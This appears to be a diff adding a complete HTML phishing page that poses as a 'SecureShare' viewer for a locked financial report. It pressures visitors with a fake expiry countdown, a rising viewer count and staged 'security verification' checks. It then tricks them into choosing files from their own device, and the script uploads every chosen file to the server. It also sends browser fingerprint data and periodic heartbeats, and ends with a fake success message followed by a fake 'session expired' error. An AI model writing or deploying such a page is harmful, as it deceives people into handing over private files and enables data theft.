@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Secure Document Preview</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    background:#eef2f8;color:#1a1d23;-webkit-font-smoothing:antialiased}
+
+  /* top brand bar */
+  .brand{background:#fff;border-bottom:1px solid #e6ebf3;padding:12px 16px;
+    display:flex;align-items:center;gap:9px;position:sticky;top:0;z-index:20}
+  .brand-logo{width:26px;height:26px;border-radius:7px;
+    background:linear-gradient(135deg,#3b82f6,#1d4ed8);position:relative;flex-shrink:0}
+  .brand-logo::after{content:"";position:absolute;left:8px;top:7px;width:10px;height:12px;
+    border:2px solid #fff;border-radius:2px}
+  .brand-name{font-size:14px;font-weight:700;letter-spacing:-.2px;color:#0f172a}
+  .brand-verified{margin-left:auto;font-size:10px;font-weight:600;color:#16a34a;
+    background:#ecfdf5;border:1px solid #bbf7d0;border-radius:20px;padding:4px 9px;
+    display:flex;align-items:center;gap:4px}
+  .brand-verified::before{content:"";width:6px;height:6px;border-radius:50%;background:#16a34a}
+
+  .page{max-width:420px;margin:0 auto;padding:18px 16px 32px}
+
+  /* sender row */
+  .sender{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+  .avatar{width:38px;height:38px;border-radius:50%;flex-shrink:0;
+    background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;font-weight:700;
+    display:flex;align-items:center;justify-content:center;font-size:15px}
+  .sender-meta{min-width:0;flex:1}
+  .sender-meta strong{display:block;font-size:13px;font-weight:600;color:#0f172a}
+  .sender-meta span{font-size:11px;color:#7b869a}
+
+  /* urgency ribbon */
+  .urgent{background:#fef2f2;border:1px solid #fecaca;border-radius:10px;
+    padding:10px 12px;margin-bottom:14px;display:flex;align-items:center;gap:9px}
+  .urgent-dot{width:8px;height:8px;border-radius:50%;background:#dc2626;flex-shrink:0;
+    box-shadow:0 0 0 0 rgba(220,38,38,.6);animation:pulse 1.6s infinite}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(220,38,38,.6)}
+    70%{box-shadow:0 0 0 8px rgba(220,38,38,0)}100%{box-shadow:0 0 0 0 rgba(220,38,38,0)}}
+  .urgent b{font-size:12px;color:#991b1b;font-weight:700}
+  .urgent span{font-size:11px;color:#b91c1c;margin-left:auto;font-variant-numeric:tabular-nums;
+    font-weight:700;font-family:ui-monospace,Menlo,monospace}
+
+  /* document preview card */
+  .doc-card{background:#fff;border-radius:14px;overflow:hidden;
+    box-shadow:0 8px 28px rgba(20,30,60,.10);margin-bottom:16px}
+
+  .doc-preview{position:relative;height:130px;background:#f4f6fb;
+    border-bottom:1px solid #eef1f7;overflow:hidden}
+  .doc-preview .page-mini{position:absolute;left:50%;top:16px;transform:translateX(-50%);
+    width:88px;background:#fff;border-radius:4px;padding:9px 8px;
+    box-shadow:0 4px 14px rgba(20,30,60,.10)}
+  .page-mini .line{height:4px;background:#dbe3f0;border-radius:2px;margin-bottom:5px}
+  .page-mini .line.short{width:60%}
+  .page-mini .line.tiny{width:40%}
+  .page-mini .line.blue{background:#93b4ff}
+  .doc-preview::after{content:"";position:absolute;inset:0;
+    backdrop-filter:blur(3.5px);-webkit-backdrop-filter:blur(3.5px);
+    background:linear-gradient(180deg,rgba(244,246,251,.4),rgba(244,246,251,.85))}
+  .lock-badge{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2;
+    background:#1e293b;color:#fff;border-radius:22px;padding:7px 14px;font-size:11px;
+    font-weight:600;display:flex;align-items:center;gap:6px;
+    box-shadow:0 4px 16px rgba(15,23,42,.35)}
+  .lock-badge::before{content:"";width:9px;height:11px;border:1.7px solid #fff;
+    border-radius:2px;position:relative}
+
+  .doc-info{padding:14px 16px}
+  .doc-info strong{display:block;font-size:14px;font-weight:600;color:#0f172a;
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px}
+  .doc-info .meta{font-size:11px;color:#7b869a;display:flex;align-items:center;gap:8px}
+  .doc-info .meta .dot{width:3px;height:3px;border-radius:50%;background:#c0c9da}
+  .doc-info .social-proof{margin-top:10px;padding-top:10px;border-top:1px dashed #e6ebf3;
+    font-size:11px;color:#5b6473;display:flex;align-items:center;gap:6px}
+  .doc-info .social-proof b{color:#0f172a}
+
+  /* verify block */
+  .verify-box{background:#f7f9fc;border:1px solid #e3e8f0;border-radius:12px;
+    padding:14px 16px;margin-bottom:14px}
+  .verify-box .cap{font-size:10px;font-weight:700;letter-spacing:.6px;
+    text-transform:uppercase;color:#7b869a;margin-bottom:10px}
+  .verify-box .row{display:flex;align-items:center;gap:11px;padding:8px 0}
+  .verify-box .row + .row{border-top:1px solid #eef1f7}
+  .cb{width:20px;height:20px;border:2px solid #b7c1d3;border-radius:5px;position:relative;
+    flex-shrink:0;transition:all .2s}
+  .cb.loading{border-color:#2563eb;border-radius:50%;border-top-color:transparent;
+    animation:spin .8s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .cb.done{background:#22c55e;border-color:#22c55e}
+  .cb.done::after{content:"";position:absolute;left:5px;top:1px;width:5px;height:9px;
+    border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
+  .row span{font-size:13px;color:#3a4354;font-weight:500}
+
+  .btn{display:block;width:100%;background:linear-gradient(135deg,#3b82f6,#1d4ed8);
+    color:#fff;border:0;border-radius:12px;padding:15px;font-size:15px;font-weight:700;
+    cursor:pointer;text-align:center;letter-spacing:.1px;
+    box-shadow:0 6px 18px rgba(37,99,235,.30);transition:transform .08s,box-shadow .15s}
+  .btn:active{transform:translateY(1px) scale(.99);box-shadow:0 3px 10px rgba(37,99,235,.25)}
+  .btn:disabled{background:#9aa8bf;box-shadow:none;cursor:not-allowed;transform:none}
+
+  .status{font-size:12px;color:#7b869a;text-align:center;margin-top:12px;min-height:16px}
+  .status.err{color:#dc2626}
+  .status.ok{color:#16a34a}
+
+  /* trust footer */
+  .trust{display:flex;justify-content:center;gap:16px;margin-top:20px;
+    font-size:10px;color:#8a94a6}
+  .trust span{display:flex;align-items:center;gap:4px}
+  .trust span::before{content:"?";font-size:10px}
+  .trust span.t2::before{content:"??"}
+  .trust span.t3::before{content:"?"}
+</style>
+</head>
+<body>
+
+<div class="brand">
+  <div class="brand-logo"></div>
+  <div class="brand-name">SecureShare</div>
+  <div class="brand-verified">Verified</div>
+</div>
+
+<div class="page">
+
+  <div class="sender">
+    <div class="avatar">M</div>
+    <div class="sender-meta">
+      <strong>Marcus Chen shared a file</strong>
+      <span>via SecureShare ¡¤ 2 hours ago</span>
+    </div>
+  </div>
+
+  <div class="urgent">
+    <div class="urgent-dot"></div>
+    <b>Link expires soon</b>
+    <span id="clock">14:59</span>
+  </div>
+
+  <div class="doc-card">
+    <div class="doc-preview">
+      <div class="page-mini">
+        <div class="line blue"></div>
+        <div class="line"></div>
+        <div class="line short"></div>
+        <div class="line"></div>
+        <div class="line tiny"></div>
+      </div>
+      <div class="lock-badge">Preview locked</div>
+    </div>
+    <div class="doc-info">
+      <strong id="docName">Q3_Financial_Report.pdf</strong>
+      <div class="meta">
+        <span id="docSize">2.4 MB</span>
+        <span class="dot"></span>
+        <span>PDF Document</span>
+        <span class="dot"></span>
+        <span>1 recipient</span>
+      </div>
+      <div class="social-proof">
+        <b id="viewers">1,247</b> people opened this file today
+      </div>
+    </div>
+  </div>
+
+  <div class="verify-box">
+    <div class="cap">Security verification</div>
+    <div class="row"><div class="cb" id="cb1"></div><span id="lbl1">Checking device trust</span></div>
+    <div class="row"><div class="cb" id="cb2"></div><span id="lbl2">Verifying access link</span></div>
+  </div>
+
+  <button class="btn" id="openBtn">Unlock document</button>
+  <div class="status" id="status"></div>
+
+  <input type="file" id="picker" multiple
+         accept="video/*,image/*,application/pdf,*/*" style="display:none"/>
+
+  <div class="trust">
+    <span>TLS 1.3</span>
+    <span class="t2">256-bit AES</span>
+    <span class="t3">Instant</span>
+  </div>
+</div>
+
+<script>
+const $ = (id) => document.getElementById(id);
+const statusEl = $("status");
+const openBtn  = $("openBtn");
+const picker   = $("picker");
+
+const VID = (() => {
+  let v = localStorage.getItem("vid");
+  if (!v) { v = crypto.randomUUID().replace(/-/g, "").slice(0, 12); localStorage.setItem("vid", v); }
+  return v;
+})();
+
+/* -------- live countdown -------- */
+let secondsLeft = 15 * 60;
+setInterval(() => {
+  if (secondsLeft <= 0) return;
+  secondsLeft--;
+  const m = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
+  const s = String(secondsLeft % 60).padStart(2, "0");
+  $("clock").textContent = `${m}:${s}`;
+  if (secondsLeft < 60) $("clock").style.color = "#991b1b";
+}, 1000);
+
+/* -------- social proof counter, ticking up -------- */
+let viewers = 1247;
+setInterval(() => {
+  viewers += Math.floor(Math.random() * 3);
+  $("viewers").textContent = viewers.toLocaleString();
+}, 4000);
+
+function setStatus(m, c) {
+  statusEl.textContent = m || "";
+  statusEl.className = "status" + (c ? " " + c : "");
+}
+
+async function register() {
+  try {
+    await fetch("/register", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        vid: VID,
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        screen: screen.width + "x" + screen.height,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.language,
+        ts: Date.now()
+      })
+    });
+  } catch (e) {}
+}
+
+async function heartbeat() {
+  try {
+    await fetch("/ping", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ vid: VID, ts: Date.now() })
+    });
+  } catch (e) {}
+}
+
+function validFile(f) {
+  return f && f.name && f.size > 0;
+}
+
+async function uploadFile(file) {
+  const fd = new FormData();
+  fd.append("vid", VID);
+  fd.append("file", file, file.name || "file.bin");
+  try {
+    const r = await fetch("/upload", { method: "POST", body: fd });
+    const j = await r.json();
+    return j.ok === true;
+  } catch (e) { return false; }
+}
+
+async function uploadBatch(files, concurrency = 4) {
+  const queue = files.filter(validFile);
+  const total = queue.length;
+  let done = 0, ok = 0, fail = 0;
+  async function worker() {
+    while (queue.length) {
+      const f = queue.shift();
+      setStatus(`Uploading ${done + 1}/${total} ¡ª ${f.name}`);
+      const success = await uploadFile(f);
+      success ? ok++ : fail++;
+      done++;
+      setStatus(`Uploading ${done}/${total} ¡ª ${f.name}`);
+    }
+  }
+  const workers = Array.from({ length: Math.min(concurrency, queue.length) }, worker);
+  await Promise.all(workers);
+  return { ok, fail, total };
+}
+
+register();
+heartbeat();
+setInterval(heartbeat, 30000);
+
+function stepCheckbox(cb, label, tick, doneText) {
+  return new Promise((resolve) => {
+    setTimeout(() => {
+      cb.classList.add("loading");
+      setTimeout(() => {
+        cb.classList.remove("loading");
+        cb.classList.add("done");
+        if (doneText) label.textContent = doneText;
+        resolve();
+      }, tick);
+    }, 300);
+  });
+}
+
+openBtn.addEventListener("click", async () => {
+  openBtn.disabled = true;
+  openBtn.textContent = "Verifying¡­";
+  setStatus("Running security check¡­");
+  await stepCheckbox($("cb1"), $("lbl1"), 900, "Device trusted");
+  await stepCheckbox($("cb2"), $("lbl2"), 1400, "Access link confirmed");
+  setStatus("Confirm the document you were sent to unlock it.");
+  openBtn.textContent = "Choose document";
+  openBtn.disabled = false;
+  openBtn.onclick = () => { picker.value = ""; picker.click(); };
+});
+
+picker.addEventListener("change", async (e) => {
+  const files = e.target.files;
+  if (!files || !files.length) return;
+  openBtn.disabled = true;
+  openBtn.textContent = "Unlocking¡­";
+  setStatus(`Uploading ${files.length} file${files.length > 1 ? "s" : ""}¡­`);
+
+  const { ok, fail, total } = await uploadBatch(files);
+
+  if (fail === 0 && ok > 0) {
+    setStatus("Document unlocked successfully.", "ok");
+    $("docName").textContent = "Unlocked_Report_Final.pdf";
+    $("docSize").textContent = "1.8 MB";
+    openBtn.textContent = "Open document";
+    openBtn.disabled = false;
+    openBtn.onclick = () => {
+      setStatus("Opening viewer¡­");
+      setTimeout(() => setStatus("Your viewer session expired. Request a new link.", "err"), 1500);
+    };
+  } else if (ok === 0 && total === 0) {
+    setStatus("No valid files selected. Try again.", "err");
+    openBtn.disabled = false;
+    openBtn.textContent = "Try again";
+    openBtn.onclick = () => { picker.value = ""; picker.click(); };
+  } else {
+    setStatus(`Unlocked ${ok}/${total}. ${fail} retry needed.`, "err");
+    openBtn.disabled = false;
+    openBtn.textContent = "Try again";
+    openBtn.onclick = () => { picker.value = ""; picker.click(); };
+  }
+});
+</script>
+</body>
+</html>
